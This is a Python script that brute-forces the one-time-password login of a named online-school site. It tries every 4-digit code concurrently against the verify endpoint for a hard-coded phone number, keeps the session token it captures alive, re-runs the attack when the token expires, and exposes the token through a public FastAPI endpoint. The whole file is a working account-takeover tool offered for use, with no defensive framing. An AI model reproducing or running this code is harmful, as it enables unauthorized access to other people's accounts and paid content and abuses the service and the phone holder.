import asyncio
import aiohttp
from fastapi import FastAPI
import uvicorn
from datetime import datetime

# Replace with your actual phone numbers
phone_numbers = ["7057047364"]

# API Endpoints
otp_request_url = "https://spec.iitschool.com/api/v1/login-otp"
verify_otp_url = "https://spec.iitschool.com/api/v1/login-otpverify"
batch_url = "https://spec.iitschool.com/api/v1/my-batch"

# FastAPI app
app = FastAPI()

# Global variable to store the token
global_token = None
current_phone_index = 0


async def request_otp(session, phone):
    """Requests an OTP for the provided phone number."""
    otp_request_data = {"phone": phone}
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    async with session.post(otp_request_url, data=otp_request_data, headers=headers) as response:
        if response.status == 200:
            response_data = await response.json()
            message = response_data.get("responseMessage", "No response message")
            print(f"OTP Request: {message}")
            return True
        else:
            print(f"Failed to request OTP: {response.status}")
        return False


async def verify_otp(session, phone, otp):
    """Verifies OTP and returns the token if successful."""
    verify_otp_data = {
        "phone": phone,
        "otp": otp,
        "type": "kkweb",
        "deviceType": "web",
        "deviceVersion": "Chrome 124",
        "deviceModel": "chrome"
    }
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    async with session.post(verify_otp_url, data=verify_otp_data, headers=headers) as response:
        if response.status == 200:
            response_data = await response.json()
            token = response_data.get("data", {}).get("token")
            if token:
                print(f"✅ Valid OTP Found: {otp} | Token: {token}")
                return token
        return None


async def fetch_token(phone_index):
    """Requests OTP, verifies it, and fetches the token."""
    global global_token
    phone = phone_numbers[phone_index]
    async with aiohttp.ClientSession() as session:
        # Step 1: Request OTP
        otp_requested = await request_otp(session, phone)
        if not otp_requested:
            print("❌ Unable to request OTP. Exiting.")
            return None

        print(f"🔍 Starting OTP verification for phone {phone}...")
        tasks = []

        # Iterate through all possible 4-digit OTPs in batches of 100
        for start_otp in range(1000, 10000, 100):  # Each batch processes 100 OTPs
            print(f"🔄 Checking OTPs {start_otp} to {start_otp + 99}...")
            batch = range(start_otp, start_otp + 100)

            for otp in batch:
                task = asyncio.create_task(verify_otp(session, phone, str(otp)))
                tasks.append(task)

                # Process tasks in batches to limit concurrent requests
                if len(tasks) >= 10:  # Max 10 concurrent tasks
                    completed, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                    
                    for task in completed:
                        token = await task
                        if token:
                            global_token = token
                            return token

                    tasks = [t for t in tasks if not t.done()]

            await asyncio.sleep(0.5)

        # Process remaining tasks
        for task in await asyncio.gather(*tasks):
            if task:
                global_token = task
                return task

        print("❌ Token not found for any OTP.")
        return None


async def check_batch_api():
    """Periodically checks the batch API and switches phone numbers on 401 error."""
    global global_token, current_phone_index
    async with aiohttp.ClientSession() as session:
        while True:
            if not global_token:
                print("🔄 Fetching new token...")
                await fetch_token(current_phone_index)

            headers = {
                "Accept": "application/json",
                "origintype": "web",
                "token": global_token,
                "usertype": "2",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            async with session.get(batch_url, headers=headers) as response:
                print(f"[{datetime.now()}] Checking batch API: Status {response.status}")
                if response.status == 200:
                    data = await response.json()
                    print(f"✅ Batch Data: {data}")
                elif response.status == 401:
                    print(f"❌ Unauthorized with phone {phone_numbers[current_phone_index]}! Switching phone...")
                    # Switch to the other phone number
                    current_phone_index = 1 - current_phone_index
                    print(f"🔄 Fetching new token with phone {phone_numbers[current_phone_index]}...")
                    await fetch_token(current_phone_index)
                else:
                    print(f"⚠️ Unexpected response: {response.status}")
            await asyncio.sleep(60)  # Wait 1 minute before checking again


@app.on_event("startup")
async def startup_event():
    """Starts the token fetch and batch API check on app startup."""
    asyncio.create_task(check_batch_api())


@app.get("/")
async def get_token():
    """Endpoint to retrieve the token."""
    if global_token:
        return {"token": global_token}
    else:
        return {"error": "Token not available. Please check the logs."}


# Run the FastAPI server
if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8080)
